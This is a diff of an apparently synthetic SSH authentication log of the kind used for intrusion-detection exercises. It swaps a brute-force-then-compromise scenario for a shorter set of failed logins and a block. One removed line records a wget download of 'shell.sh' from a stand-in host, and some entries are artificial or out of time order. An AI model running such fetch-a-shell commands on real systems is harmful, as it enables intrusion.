@@ -1,40 +1,9 @@
-2025-01-15 06:00:00 sshd[1234]: Valid user admin from 192.168.1.10
-2025-01-15 06:00:05 sshd[1234]: Accepted password for admin from 192.168.1.10 port 54321
-2025-01-15 06:05:00 sshd[1235]: Valid user john from 192.168.1.20
-2025-01-15 06:05:10 sshd[1235]: Accepted password for john from 192.168.1.20 port 62000
-2025-01-15 06:30:00 sshd[1236]: Valid user sarah from 192.168.1.30
-2025-01-15 06:30:05 sshd[1236]: Accepted password for sarah from 192.168.1.30 port 60000
-2025-01-15 07:00:00 sshd[1237]: Connection closed by 192.168.1.10 port 54321 [preauth]
-2025-01-15 07:30:00 sshd[1238]: Valid user root from 192.168.1.80
-2025-01-15 07:30:05 sshd[1238]: Accepted password for root from 192.168.1.80 port 49500
-2025-01-15 07:45:00 sshd[1239]: Invalid user test from 192.168.1.50
-2025-01-15 08:00:00 sshd[1240]: Valid user admin from 192.168.1.100
-2025-01-15 08:00:05 sshd[1240]: Accepted password for admin from 192.168.1.100 port 47000
-2025-01-15 08:05:00 sshd[1241]: Connection reset by 192.168.1.60 port 51000 [preauth]
-2025-01-15 08:15:21 sshd[1300]: Connection attempt from 185.122.21.55 port 45811
-2025-01-15 08:15:22 sshd[1300]: Invalid user admin from 185.122.21.55
-2025-01-15 08:15:23 sshd[1301]: Connection attempt from 185.122.21.55 port 45812
-2025-01-15 08:15:24 sshd[1301]: Invalid user root from 185.122.21.55
-2025-01-15 08:15:25 sshd[1302]: Connection attempt from 185.122.21.55 port 45813
-2025-01-15 08:15:26 sshd[1302]: Invalid user postgres from 185.122.21.55
-2025-01-15 08:15:30 sshd[1303]: Connection attempt from 185.122.21.55 port 45820
-2025-01-15 08:15:31 sshd[1303]: Invalid user mysql from 185.122.21.55
-2025-01-15 08:15:35 sshd[1304]: Connection attempt from 185.122.21.55 port 45823
-2025-01-15 08:15:36 sshd[1304]: Invalid user developer from 185.122.21.55
-2025-01-15 08:15:40 sshd[1305]: Connection attempt from 185.122.21.55 port 45825
-2025-01-15 08:15:40 sshd[1305]: Invalid user admin from 185.122.21.55
-2025-01-15 08:15:45 sshd[1306]: Connection attempt from 185.122.21.55 port 45830
-2025-01-15 08:15:45 sshd[1306]: Invalid user guest from 185.122.21.55
-2025-01-15 08:15:50 sshd[1307]: Connection attempt from 185.122.21.55 port 45833
-2025-01-15 08:15:51 sshd[1307]: Invalid user developer from 185.122.21.55
-2025-01-15 08:16:05 sshd[1308]: Connection attempt from 185.122.21.55 port 45835
-2025-01-15 08:16:06 sshd[1308]: Valid user developer from 185.122.21.55
-2025-01-15 08:16:10 sshd[1308]: Accepted password for developer from 185.122.21.55 port 45835
-2025-01-15 08:16:15 sshd[1308]: User developer from 185.122.21.55 is now authenticated
-2025-01-15 08:17:00 sshd[1308]: developer changed root privileges from 0 to 0 via sudo
-2025-01-15 08:17:30 sshd[1308]: developer executed remote command: wget http://192.0.2.88/shell.sh
-2025-01-15 08:20:00 sshd[1240]: Valid user john from 192.168.1.20
-2025-01-15 08:20:05 sshd[1240]: Accepted password for john from 192.168.1.20 port 62005
-2025-01-15 09:00:00 sshd[1245]: Connection closed by admin from 192.168.1.10 port 54321
-2025-01-15 09:00:01 sshd[1246]: Valid user admin from 192.168.1.10
-2025-01-15 09:00:06 sshd[1246]: Accepted password for admin from 192.168.1.10 port 54322
+2024-01-15 07:22:14 sshd[1234]: authentication failure user=root from=45.142.212.98
+2024-01-15 07:22:16 sshd[1234]: authentication failure user=admin from=45.142.212.98
+2024-01-15 07:22:18 sshd[1234]: authentication failure user=ubuntu from=45.142.212.98
+2024-01-15 07:22:20 sshd[1234]: authentication failure user=test from=45.142.212.98
+2024-01-15 07:22:22 sshd[1234]: authentication failure user=oracle from=45.142.212.98
+2024-01-15 07:22:24 sshd[1234]: IP 45.142.212.98 blocked after 5 failed attempts
+2024-01-15 08:15:22 sshd[5678]: Accepted publickey for robert.wilson from 192.168.1.92
+2024-01-15 03:15:18 sshd[7890]: Accepted publickey for SVC_DevOps from 192.168.10.50
+2024-01-15 03:22:28 sshd[8901]: Accepted publickey for sarah.jenkins from 73.92.184.201
